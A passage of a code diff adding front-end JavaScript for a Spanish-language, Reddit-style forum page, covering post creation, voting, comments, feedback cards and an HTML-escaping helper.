+        <span>por <span class="post-by">u/${escH(ME.username)}</span></span>·
+        <span class="rank-badge ${r.cls}">● ${r.label}</span>·
+        ${flairHtml}·<span>ahora</span>
+      </div>
+      <div class="post-title" onclick="toggleExpand('${id}')">${escH(title)}</div>
+      ${body?`<div class="post-preview">${escH(body.slice(0,160))}</div>`:''}
+      <div class="post-actions">
+        <button class="act-btn" onclick="toggleExpand('${id}')">💬 <span id="cn-${id}">0</span> comentarios</button>
+        <button class="act-btn">🔗 Compartir</button>
+      </div>
+      <div class="post-expanded" id="pe-${id}">
+        ${body?`<div class="post-full">${escH(body)}</div>`:''}
+        <div class="reply-box"><textarea placeholder="Comentar..." maxlength="500" oninput="rchr(this)"></textarea><div class="reply-box-footer"><span class="reply-char">0/500</span><button class="btn btn-orange btn-sm" onclick="addComment('${id}',this)">Comentar</button></div></div>
+        <div id="cm-${id}"></div>
+      </div>
+    </div>`;
+  document.getElementById('postsFeed').prepend(card);
+  postCount++;
+  document.getElementById('sPostCount').textContent=postCount;
+  document.getElementById('pTitle').value='';
+  document.getElementById('pBody').value='';
+  document.querySelectorAll('#postModal .chip.on').forEach(c=>c.classList.remove('on'));
+  closePostModal();
+  showToast('✓ Post publicado');
+}
+
+// ════════════════════════════════════════════
+//  VOTING
+// ════════════════════════════════════════════
+function doVote(e,id,dir){
+  e.stopPropagation();
+  const score=document.getElementById('vn-'+id);
+  let v=parseInt(score.textContent)||0;
+  const card=score.closest('.post-card')||score.closest('.fb-card');
+  const up=card.querySelector('.vote-up');
+  const dn=card.querySelector('.vote-dn');
+  const isUp=dir==='up';
+  const btn=isUp?up:dn;
+  const other=isUp?dn:up;
+  if(other.classList.contains('on')){other.classList.remove('on');v+=isUp?1:-1;}
+  if(btn.classList.contains('on')){btn.classList.remove('on');v+=isUp?-1:1;}
+  else{btn.classList.add('on');v+=isUp?1:-1;}
+  score.textContent=v;
+  score.className='vote-num'+(up.classList.contains('on')?' up':(dn.classList.contains('on')?' dn':''));
+}
+function cvote(btn){
+  btn.classList.toggle('on');
+  const sc=btn.parentElement.querySelector('.c-score');
+  let n=parseInt(sc.textContent)||0;
+  n+=btn.classList.contains('on')?1:-1;
+  sc.textContent=n;
+}
+
+// ════════════════════════════════════════════
+//  COMMENTS
+// ════════════════════════════════════════════
+function toggleExpand(id){document.getElementById('pe-'+id).classList.toggle('open');}
+function rchr(ta){const s=ta.closest('.reply-box').querySelector('.reply-char');if(s)s.textContent=ta.value.length+'/500';}
+function addComment(pid,btn){
+  if(!ME) return showToast('Inicia sesión para comentar',true);
+  const ta=btn.closest('.reply-box').querySelector('textarea');
+  const text=ta.value.trim();
+  if(!text) return showToast('El comentario no puede estar vacío',true);
+  const r=RANKS[ME.rank];
+  const div=document.createElement('div');
+  div.className='comment';
+  div.innerHTML=`
+    <div class="c-line"></div>
+    <div class="c-body">
+      <div class="c-meta">
+        <span class="c-author">u/${escH(ME.username)}</span>
+        <span class="rank-badge ${r.cls}">● ${r.label}</span>
+        <span>ahora</span>
+      </div>
+      <div class="c-text">${escH(text)}</div>
+      <div class="c-actions">
+        <button class="c-vote-up" onclick="cvote(this)">▲</button>
+        <span class="c-score">1</span>
+        <button class="c-vote-dn" onclick="cvote(this)">▼</button>
+        <button class="c-act">Responder</button>
+      </div>
+    </div>`;
+  document.getElementById('cm-'+pid).prepend(div);
+  const cn=document.getElementById('cn-'+pid);
+  if(cn){const n=(document.getElementById('cm-'+pid).querySelectorAll('.comment').length);cn.textContent=n;}
+  ta.value=''; rchr(ta);
+  showToast('✓ Comentario publicado');
+}
+
+// ════════════════════════════════════════════
+//  FEEDBACK
+// ════════════════════════════════════════════
+function setStar(n){starVal=n;document.querySelectorAll('.star').forEach((s,i)=>s.classList.toggle('on',i<n));}
+function toggleChip(btn){btn.classList.toggle('on');}
+function submitFb(){
+  if(!ME) return showToast('Inicia sesión para enviar feedback',true);
+  const title=document.getElementById('fbT').value.trim();
+  const body=document.getElementById('fbB').value.trim();
+  if(!title) return showToast('El título es obligatorio',true);
+  const chips=[...document.querySelectorAll('.fb-body .chip.on')].map(c=>c.textContent.trim());
+  const stars='★'.repeat(starVal)+'☆'.repeat(5-starVal);
+  const hasS=chips.includes('Seguridad'), hasFeat=chips.includes('Nueva función'), hasUX=chips.includes('UI/UX');
+  const barCls=hasS?'sec':hasFeat?'feat':hasUX?'ux':'bug';
+  const r=RANKS[ME.rank];
+  const card=document.createElement('div');
+  card.className='fb-card';
+  card.innerHTML=`
+    <div class="fb-bar ${barCls}"></div>
+    <div class="vote-col" style="background:transparent">
+      <button class="vote-up" onclick="doVote(event,'fbx-${Date.now()}','up')">▲</button>
+      <span class="vote-num" id="vn-fbx-${Date.now()}">1</span>
+      <button class="vote-dn" onclick="doVote(event,'fbx-${Date.now()}','dn')">▼</button>
+    </div>
+    <div class="post-main">
+      <div class="post-meta">
+        <span class="post-by">u/${escH(ME.username)}</span>·
+        <span class="rank-badge ${r.cls}">● ${r.label}</span>·
+        ${chips.map(c=>`<span class="flair flair-tech">${c}</span>`).join(' ')}
+        ${starVal?'·<span>'+stars+'</span>':''}·<span>ahora</span>
+      </div>
+      <div class="post-title" style="font-size:.9rem">${escH(title)}</div>
+      ${body?`<div class="post-preview">${escH(body)}</div>`:''}
+      <div class="post-actions"><button class="act-btn">💬 0</button><button class="act-btn">🔗 Compartir</button></div>
+    </div>`;
+  document.getElementById('fbFeed').prepend(card);
+  document.getElementById('fbT').value='';
+  document.getElementById('fbB').value='';
+  setStar(0);
+  document.querySelectorAll('.fb-body .chip.on').forEach(c=>c.classList.remove('on'));
+  showToast('✓ Feedback enviado');
+}
+
+// ════════════════════════════════════════════
+//  UTILS
+// ════════════════════════════════════════════
+function escH(s){const d=document.createElement('div');d.textContent=s;return d.innerHTML;}
+function showToast(msg,err=false){
+  const t=document.getElementById('toast');
+  t.textContent=msg;
+  t.style.borderLeftColor=err?'var(--red)':'var(--orange)';
+  t.style.color=err?'var(--red)':'var(--text)';
+  t.style.display='block'; t.style.animation='none';
+  requestAnimationFrame(()=>t.style.animation='toastIn .2s ease');
+  clearTimeout(window._tt);
+  window._tt=setTimeout(()=>t.style.display='none',2500);
+}
+
+// Enter key login
+document.addEventListener('DOMContentLoaded',()=>{
+  ['lUser','lPass'].forEach(id=>{
+    document.getElementById(id).addEventListener('keydown',e=>{if(e.key==='Enter')doLogin();});
+  });
+  document.getElementById('rCode').addEventListener('input',function(){
+    this.value=this.value.toUpperCase().replace(/[^A-Z0-9\-]/g,'');
+  });
+});
+</script>
+</body>
+</html>
